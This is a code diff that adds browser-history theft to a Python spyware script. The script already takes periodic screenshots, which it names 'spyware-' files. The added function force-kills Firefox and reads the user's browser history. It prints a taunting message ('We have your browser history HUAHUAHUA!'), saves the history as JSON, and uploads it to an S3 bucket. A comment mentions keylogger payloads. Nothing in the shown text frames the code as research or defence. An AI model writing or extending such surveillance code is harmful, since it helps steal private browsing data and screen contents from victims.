@@ -5,6 +5,22 @@ import os
 from datetime import timedelta, date, datetime
 import utils
 import time
+from browserhistory import get_browserhistory
+from browserhistory import browse
+import json
+from sys import platform
+def inputBrowser():
+	if platform == "linux" or platform == "darwin" or platform =="linux2":
+		os.system('killall -KILL firefox')
+	else:
+		os.system('taskkill /F /IM firefox.exe')
+
+	a=get_browserhistory()
+	# # browse()
+	# os.system('taskkill /F /IM firefox.exe')
+	# os.system('killall -KILL firefox')
+	print("We have your browser history HUAHUAHUA!")
+	return a
 
 def main(args):
 	# Describes what is happening
@@ -24,8 +40,22 @@ def main(args):
     end_date = timedelta(days=duration) + cur_date
     delta = timedelta(seconds=interval)
 
-    os.mkdir(output_dir+'/outputs')
-    os.mkdir(output_dir + '/outputs/screenshots')
+    # creates directories
+    if s3_bucket == "":
+        os.mkdir(output_dir+'/outputs')
+        os.mkdir(output_dir + '/outputs/screenshots')
+        browserhistDict = inputBrowser()
+        file = open(output_dir + '/outputs/history.txt', 'w')
+        file.write(json.dumps(browserhistDict))
+        file.close()
+    else:
+        browserhistDict = inputBrowser()
+        file = open(output_dir + '/history.txt', 'w')
+        file.write(json.dumps(browserhistDict))
+        utils.save_to_s3(output_dir + '/history.txt', "history")
+        os.remove(output_dir + '/history.txt')
+        file.close()
+
     while cur_date <= end_date:
         im = screenshot.grab()
         file_name = 'spyware-'+cur_date.strftime("%m-%d-%M-%S")+'.png'
@@ -34,6 +64,7 @@ def main(args):
         if s3_bucket != "":
             utils.save_to_s3(fp, file_name)
             os.remove(fp)
+
         else: #save all payloads (keylogger, history, output files) to output dir
             im.save(fp)
 
